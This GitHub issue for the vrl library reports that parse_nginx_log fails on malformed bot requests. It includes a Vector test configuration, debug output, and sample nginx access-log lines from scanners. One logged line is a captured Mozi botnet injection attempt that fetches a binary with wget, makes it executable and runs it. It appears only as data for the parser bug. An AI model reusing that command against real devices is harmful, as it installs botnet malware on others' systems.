# Issue #226: `parse_nginx_log` fails for various logged bot requests

- **URL:** https://github.com/vectordotdev/vrl/issues/226
- **Author:** @hashworks
- **Status:** CLOSED (completed)
- **Created:** 2022-10-04T10:26:37Z
- **Closed:** 2023-07-05T14:54:42Z
- **Labels:** vrl:stdlib

## Description

### A note for the community

<!-- Please keep this note for the community -->
* Please vote on this issue by adding a 👍 [reaction](https://blog.github.com/2016-03-10-add-reactions-to-pull-requests-issues-and-comments/) to the original issue to help the community and maintainers prioritize this request
* If you are interested in working on this issue or have submitted a pull request, please leave a comment
<!-- Thank you for keeping this note for the community -->


### Problem

My nginx default vhost receives a ton of random bot requests every day, some are non-standard requests (http status 400 bad request) and fail to be parsed by `parse_nginx_log(.message, "combined")` even though they are logged properly.

### Configuration

```toml
[transforms.nginx_access_parsed]
type = "remap"
inputs = [ "nginx_access" ]
source = """
structured, err = parse_nginx_log(.message, "combined")
if err != null {
  log((err + "('" + .message + "')") ?? "null", level: "error")
  abort
}

. = merge(., structured)
"""

[[tests]]
name = "nginx access by bot: mglndd"

[[tests.inputs]]
insert_at = "nginx_access_parsed"
type = "log"

    [tests.inputs.log_fields]
    message = "192.241.206.122 - - [18/Sep/2022:10:03:39 +0200] \"MGLNDD_192.241.213.192_443\" 400 150 \"-\" \"-\""
    file = "/var/log/test.example.net/access.log"

[[tests.outputs]]
extract_from = "nginx_access_parsed"

    [[tests.outputs.conditions]]
    type = "vrl"
    source = """
        assert!(is_timestamp(.timestamp))
        assert_eq!(.client, "192.241.206.122")
        assert_eq!(.request, "MGLNDD_192.241.213.192_443")
        assert_eq!(.status, 400)
        assert_eq!(.size, 150)
    """
```


### Version

0.24.1

### Debug Output

```text
Running tests
2022-10-04T10:24:56.990163Z DEBUG vector::topology::builder: Building new source. component=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.990305Z DEBUG vector::topology::builder: Building new transform. component=nginx_access_parsed
2022-10-04T10:24:56.994670Z DEBUG vector::topology::builder: Building new sink component=nginx_access_parsed-sink-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.997380Z  INFO vector::topology::running: Running healthchecks.
2022-10-04T10:24:56.997387Z DEBUG vector::topology::running: Connecting changed/added component(s).
2022-10-04T10:24:56.997393Z  INFO vector::topology::builder: Healthcheck: Passed.
2022-10-04T10:24:56.997394Z DEBUG vector::topology::running: Configuring outputs for source. component=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.997400Z DEBUG vector::topology::running: Configuring output for component. component=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 output_id=None
2022-10-04T10:24:56.997407Z DEBUG vector::topology::running: Configuring outputs for transform. component=nginx_access_parsed
2022-10-04T10:24:56.997412Z DEBUG vector::topology::running: Configuring output for component. component=nginx_access_parsed output_id=None
2022-10-04T10:24:56.997418Z DEBUG vector::topology::running: Connecting inputs for transform. component=nginx_access_parsed
2022-10-04T10:24:56.997424Z DEBUG vector::topology::running: Adding component input to fanout. component=nginx_access_parsed fanout_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.997430Z DEBUG vector::topology::running: Connecting inputs for sink. component=nginx_access_parsed-sink-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.997436Z DEBUG vector::topology::running: Adding component input to fanout. component=nginx_access_parsed-sink-b18a0af5-8502-437d-b761-07b695962d46 fanout_id=nginx_access_parsed
2022-10-04T10:24:56.997444Z DEBUG vector::topology::running: Spawning new source. key=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.997458Z DEBUG vector::topology::running: Spawning new transform. key=nginx_access_parsed
2022-10-04T10:24:56.997465Z DEBUG source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector::topology::builder: Source pump starting.
2022-10-04T10:24:56.997470Z TRACE vector::topology::running: Spawning new sink. key=nginx_access_parsed-sink-b18a0af5-8502-437d-b761-07b695962d46
2022-10-04T10:24:56.997470Z TRACE source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector_buffers::topology::channel::limited_queue: Sent item.
2022-10-04T10:24:56.997479Z TRACE source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector_common::internal_event::events_sent: Events sent. count=1 byte_size=549 output=_default
2022-10-04T10:24:56.997482Z TRACE source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector_core::fanout: Processing control message outside of send: ControlMessage::Add(ComponentKey { id: "nginx_access_parsed" })
2022-10-04T10:24:56.997495Z TRACE source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector_buffers::topology::channel::limited_queue: Sent item.
2022-10-04T10:24:56.997496Z DEBUG source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector::topology::builder: Finished.
2022-10-04T10:24:56.997500Z  INFO vector_common::shutdown: All sources have finished.
2022-10-04T10:24:56.997506Z TRACE source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector_core::fanout: Sent item to fanout.
2022-10-04T10:24:56.997508Z TRACE transform{component_kind="transform" component_id=nginx_access_parsed component_type=remap component_name=nginx_access_parsed}: vector_common::internal_event::events_received: Events received. count=1 byte_size=549
2022-10-04T10:24:56.997512Z DEBUG source{component_kind="source" component_id=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-source-b18a0af5-8502-437d-b761-07b695962d46}: vector::topology::builder: Source pump finished.
2022-10-04T10:24:56.998520Z ERROR transform{component_kind="transform" component_id=nginx_access_parsed component_type=remap component_name=nginx_access_parsed}: vrl_stdlib::log: function call error for "parse_nginx_log" at (18:55): failed parsing log line('192.241.206.122 - - [18/Sep/2022:10:03:39 +0200] "MGLNDD_192.241.213.192_443" 400 150 "-" "-"') internal_log_rate_secs=1 vrl_position=75
2022-10-04T10:24:56.998552Z DEBUG transform{component_kind="transform" component_id=nginx_access_parsed component_type=remap component_name=nginx_access_parsed}: vector::internal_events::remap: Event mapping aborted; discarding event. internal_log_rate_secs=30
2022-10-04T10:24:56.998576Z TRACE transform{component_kind="transform" component_id=nginx_access_parsed component_type=remap component_name=nginx_access_parsed}: vector_common::internal_event::events_sent: Events sent. count=0 byte_size=24 output=_default
2022-10-04T10:24:56.998593Z DEBUG transform{component_kind="transform" component_id=nginx_access_parsed component_type=remap component_name=nginx_access_parsed}: vector::topology::builder: Finished.
2022-10-04T10:24:56.998646Z DEBUG sink{component_kind="sink" component_id=nginx_access_parsed-sink-b18a0af5-8502-437d-b761-07b695962d46 component_type=unit_test component_name=nginx_access_parsed-sink-b18a0af5-8502-437d-b761-07b695962d46}: vector::topology::builder: Finished.
test nginx access by bot: mglndd ... failed

failures:

test nginx access by bot: mglndd:

checks for transforms ["nginx_access_parsed"] failed: no events received. Topology may be disconnected or transform is missing inputs.
```


### Example Data

```nginx
62.233.50.179 - - [03/Oct/2022:21:59:42 +0200] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
194.165.16.37 - - [04/Oct/2022:01:44:15 +0200] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
45.227.254.55 - - [04/Oct/2022:02:08:49 +0200] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
104.248.193.73 - - [04/Oct/2022:03:07:27 +0200] "]&\xDF\xBDV\xE7\xBB<\x10;\xA2b}\xDFM\x1D" 400 150 "-" "-"
92.255.85.183 - - [04/Oct/2022:03:54:21 +0200] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
85.202.168.47 - - [04/Oct/2022:04:34:49 +0200] "" 400 0 "-" "-"
85.202.168.47 - - [04/Oct/2022:04:34:49 +0200] "" 400 0 "-" "-"
128.199.92.8 - - [04/Oct/2022:06:36:53 +0200] "\xF1\x85S\xCD" 400 150 "-" "-"
157.230.35.105 - - [04/Oct/2022:07:43:33 +0200] "\xA54\xA9\x1F*\x14\xA2\xDA}\x1F\xBFo\x16p\xD8+" 400 150 "-" "-"
85.31.46.179 - - [04/Oct/2022:07:59:03 +0200] "" 400 0 "-" "-"
206.189.56.44 - - [04/Oct/2022:08:09:08 +0200] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xC0W\xD6\xCD\xF4f\xB8&]\x94Xg(\x9D\x18\xD1B\xAD^R\x82t?R\xF5\x138\x86\x15_=\x09\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
128.199.26.238 - - [04/Oct/2022:08:26:18 +0200] "=\xC3\xF7\x14\x03\x98\xEDU)\xD1\x8D" 400 150 "-" "-"
81.209.147.8 - - [04/Oct/2022:10:21:45 +0200] "" 408 0 "-" "-"
198.199.119.206 - - [04/Oct/2022:11:03:51 +0200] "MGLNDD_192.241.213.192_80" 400 150 "-" "-"
116.212.156.44 - - [04/Oct/2022:11:05:12 +0200] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 150 "-" "-"
192.241.196.130 - - [04/Oct/2022:11:46:40 +0200] "MGLNDD_192.241.213.192_443" 400 150 "-" "-"
```
